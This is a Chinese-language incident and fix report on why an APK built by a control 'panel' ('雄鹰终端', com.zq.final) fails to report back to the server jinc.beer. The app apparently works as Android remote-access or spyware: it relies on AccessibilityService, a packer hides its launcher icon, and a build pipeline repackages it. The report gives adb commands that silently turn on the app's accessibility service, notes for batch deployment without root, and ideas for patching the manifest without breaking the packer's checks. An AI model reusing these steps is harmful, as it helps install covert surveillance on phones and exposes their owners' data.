# 雄鹰终端数据不回传修复说明

日期：2026-10-23
涉及服务器：192.168.132.128（root，测试面板 jinc.beer）

---

## 一、现象

- 面板构建的 APK（build_900001，`com.zq.final` / "雄鹰终端" v7.4.9）安装到手机后
- 面板"设备"列表一直为空：`devices` 表 count=0
- 后端日志只有浏览器页面自身的 `[ws-token-url]` 轮询，没有任何设备注册/上报

## 二、根因（一句话）

**雄鹰终端是"无障碍服务（AccessibilityService）型"终端。无障碍服务未开启时，核心服务
`PlatformAssistDaemon`（:core 进程）根本不会运行，因此不注册、不回传。**

辅助因素：母包加固壳把桌面图标入口剥掉了——Manifest 里启动 intent-filter 只有
`MAIN + MULTIWINDOW_LAUNCHER + DEFAULT`，**没有标准 `android.intent.category.LAUNCHER`**，
所以安装后桌面无图标、普通用户无法点进配置页去开启无障碍，只能靠直接拉起 Gateway。

## 三、排查链路（关键步骤）

1. 确认目标包：母包 `mother.apk` 真实包名 = **com.zq.final**（应用名"雄鹰终端"，v7.4.9，
   versionCode 70409）。手机上 `com.zq.final` base.apk 与服务器构建产物 build_900001.apk
   大小完全一致（27,343,445 字节），即用户安装的就是本次免 apktool 构建的产物。
   ⚠️ 注意：手机上另有一个 `com.xhl.nanchuan`（"日南川" v2.2.9）是**另一个应用**，与本构建无关。
   早期验证时 monkey 启动的是它，测错了对象。
2. 排除项：
   - 服务器侧：`https://jinc.beer/` 公网可达（Cloudflare <cf-edge-1> → 回源内网 nginx 80 →
     反代 127.0.0.1:39445 后端），面板登录页正常返回；后端进程、39445 监听正常。
   - 手机侧：临时停掉 Clash Meta VPN（force-stop）后设备仍未注册 → **手机代理不是根因**。
3. 破局点：`am start` 直接拉起 `com.zq.final/com.nest.craft.spark.activity.SplashGateway` 成功
   （**零崩溃**，免 apktool 方案在真实产物上再次验证通过），进入 `DaemonConfigPage`
   （WebView 配置页），UI 文本明确写着：
   > "开启无障碍服务——为了获得更流畅的体验，请在设置中开启无障碍权限"
   > "请在列表中找到已安装的应用或已下载的服务，然后开启 雄鹰终端"
4. 检查手机设置：`settings get secure enabled_accessibility_services` 为空、
   `accessibility_enabled` 为空 → **无障碍服务从未开启** → 实锤根因。

## 四、解决方案（已验证生效）

用 adb 直接写入安全设置，开启雄鹰终端的无障碍服务：

```bash
adb shell settings put secure enabled_accessibility_services \
  "com.zq.final/com.nest.craft.spark.service.PlatformAssistDaemon"
adb shell settings put secure accessibility_enabled 1
```

生效后 20 秒内，后端日志出现完整回传链：


面板 `devices` 表：**count=1**，设备 `<device-id>`（Pixel 2 XL / Android 11 / has_access=true）
已注册上线。

## 五、部署要点（每台终端都必须做）

1. **无障碍服务是回传的前提**。每台装雄鹰终端的设备，安装后必须开启
   `com.zq.final/com.nest.craft.spark.service.PlatformAssistDaemon` 无障碍服务，否则设备
   不会出现在面板上。
2. 手动开启路径：设置 → 无障碍 → 已安装的应用 → 雄鹰终端 → 开启。
   由于桌面无图标，手动方式可先由 adb 拉起配置页再点"去开启"：
   `adb shell am start -n com.zq.final/com.nest.craft.spark.activity.SplashGateway`
3. 自动化（批量部署用，配合设备管理/ADB）：上述 `settings put secure` 两条命令即可，
   无需 root。Android 11+ 部分系统会在首次开启时弹系统确认，需在设置页内人工确认一次。
4. 可选优化（后续）：若希望终端"装完即回传"，可在构建阶段给 AndroidManifest 补回
   `android.intent.category.LAUNCHER`（免 apktool 方案需以二进制方式 patch manifest 的
   intent-filter，注意保持加固校验不破坏），或由面板下发"开机自动开无障碍"引导。

## 六、遗留事项

- 排障期间 force-stop 了手机上的 Clash Meta（com.github.metacubex.clash.meta），
  需要时手动重新打开；本机回传走 WiFi 直连 jinc.beer 已验证可用，日常开着 Clash 时
  若回传中断，需检查 Clash 节点/规则是否把 jinc.beer 的 CF 链路放行。
- 生产机（<prod-domain-1> / <prod-domain-2>）的 worker 尚未同步免 apktool 三件套
  （build_worker.js / repack.py / arsc_rename.py / build_admin.js），如需同步可参照
  服务器 `/root/build_tools/` 部署。
- 早期"崩溃验证"曾误用 com.xhl.nanchuan（日南川，另一应用）作为启动对象；本次已用
  真实产物 com.zq.final 直接启动验证，免 apktool 方案在真实环境零崩溃成立。
